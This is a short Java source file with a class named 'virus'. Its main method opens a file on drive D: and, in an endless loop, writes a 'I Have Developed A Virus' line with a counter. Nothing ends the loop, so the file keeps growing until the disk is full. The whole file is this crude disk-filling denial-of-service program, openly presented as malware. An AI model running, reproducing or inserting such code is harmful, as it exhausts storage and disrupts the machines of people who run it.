
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;


public class virus {
    public static void main(String []args) throws IOException {
        FileWriter fw = new FileWriter(new File("D:\\newVirusALL.aditya"));
        short s=0;
        
        while(true) {
            ++s;
            fw.write("I Have Developed A Virus"+s+"\n");
        }
    }
}
